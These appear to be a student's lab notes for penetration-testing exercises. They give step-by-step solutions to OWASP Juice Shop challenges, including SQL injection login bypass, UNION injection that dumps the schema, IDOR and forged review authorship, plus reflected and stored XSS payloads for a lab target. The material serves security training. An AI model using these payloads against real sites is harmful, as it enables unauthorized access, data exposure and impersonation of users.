Penetration Testing & Secure Systems Lab – Quick Notes
Target 1: OWASP Juice Shop (6 Challenges)
________________________________________
1. Sensitive Data Exposure (A01/A05)
Goal: Access a confidential file that should not be publicly reachable.
Steps
1.	Open the application:
2.	http://<IP>:<PORT>
3.	Browse to:
4.	/ftp/acquisitions.md
5.	Example:
6.	http://192.168.x.x:38476/ftp/acquisitions.md
What to remember
•	Juice Shop exposes files under /ftp.
•	This challenge tests directory/static file exposure.
•	If the file loads in the browser, the challenge is complete.
________________________________________
2. Security Misconfiguration (A05)
Goal: Access the application's metrics endpoint without authentication.
Steps
Visit:
http://<IP>:<PORT>/metrics
Example:
http://192.168.x.x:38476/metrics
Notes
•	Prometheus metrics are often accidentally exposed.
•	No login is required.
•	Simply opening the page usually solves the challenge.
________________________________________
3. SQL Injection – Login Bypass (A03)

Goal: Log in as administrator.
Payload
Username:
' OR TRUE--
Password:
1234
Explanation
Backend query becomes similar to:
SELECT *
FROM Users
WHERE email='' OR TRUE--'
AND password='1234';
Because:
OR TRUE
always evaluates to true, authentication is bypassed.
Notes
•	Try administrator login page.
•	-- comments out the remaining query.
________________________________________
4. Broken Access Control – IDOR (A01)
Goal: View another user's basket.
Steps
1.	Add any item to basket.
2.	Open Developer Tools.
3.	F12
4.	Go to:
5.	Application
6.	→ Session Storage
7.	→ localhost
8.	Locate basket-related key/value.
9.	Change basket ID.
Example:
BasketId: 3
↓
BasketId: 2
6.	Press Enter and refresh.
Notes
•	IDOR = Insecure Direct Object Reference.
•	You're changing the object identifier directly.
________________________________________
5. UNION SQL Injection (A03)
Goal: Extract database schema.
Payload
/rest/products/search?q=qwert')) UNION SELECT 1,2,3,sql,5,6,7,8,9 FROM sqlite_master--
Example:
http://<IP>:<PORT>/rest/products/search?q=qwert'))%20UNION%20SELECT%201,2,3,sql,5,6,7,8,9%20FROM%20sqlite_master--
Explanation
sqlite_master stores:
•	table names
•	schema definitions
•	CREATE TABLE statements
The column:
sql
reveals database structure.
Notes
•	Ensure column count matches.
•	Juice Shop uses SQLite.
________________________________________
6. Broken Access Control – Submit Review as Another User
Goal: Post review using another user's identity.
Steps
1.	Open any product.
2.	Click:
3.	Add Review
4.	Press:
5.	F12
6.	Go to:
7.	Network
8.	Submit review.
9.	Find request returning:
10.	HTTP 201 PUT
11.	Right-click.
12.	Copy
13.	→ Copy as Fetch
14.	Open Console.
15.	Paste fetch request.
16.	Modify:
"author":"victim@gmail.com"
11.	Execute.
Notes
•	Server trusts client-provided author field.
•	Review gets attributed to another user.

3. Cross-Site Scripting (XSS)
Payload:
<img src=x onerror=alert(1)>
Notes
•	Invalid image causes onerror to execute.
•	Useful when <script> tags are filtered.
________________________________________
Target 3: NanoCorp
________________________________________
1. Reflected XSS
Payload:
<script>alert('XSS')</script>
If not working
Try:
<img src=x onerror=alert('XSS')>
or
<svg onload=alert('XSS')>
Notes
•	Reflected XSS executes immediately after submission.
•	Depends heavily on filtering rules.
________________________________________
2. Stored XSS
Payload:
<img src="#" onerror="alert('XSS')">
Alternative:
<iframe src='#' onload='alert("XSS")'></iframe>
Notes
•	Payload is saved in database.
•	Another user visiting page triggers execution.
